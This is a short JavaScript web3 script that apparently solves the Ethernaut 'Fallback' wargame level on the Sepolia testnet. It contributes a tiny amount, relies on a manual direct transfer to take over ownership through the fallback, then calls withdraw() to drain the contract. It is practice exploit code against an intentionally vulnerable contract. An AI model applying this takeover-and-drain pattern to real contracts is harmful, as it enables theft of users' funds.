const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/1-Fallback.json');
const contract_address = '0x6F3738bAC29D12Fc889C213651e75682c83e8BB9';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve0() {
  var res;

  res = await contract.methods.contributions(account[0].address).call();
  console.log(res);

  res = await contract.methods.contribute().send({
    from: account[0].address, 
    value: 1
  });
  console.log(res);

  res = await contract.methods.contributions(account[0].address).call();
  console.log(res);
}

async function solve1() {
  var res;

  res = await contract.methods.owner().call();
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);

  res = await contract.methods.withdraw().send({from: account[0].address});
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);
}

solve0();
// Use MetaMask send SepoliaETH to contract_address
// solve1();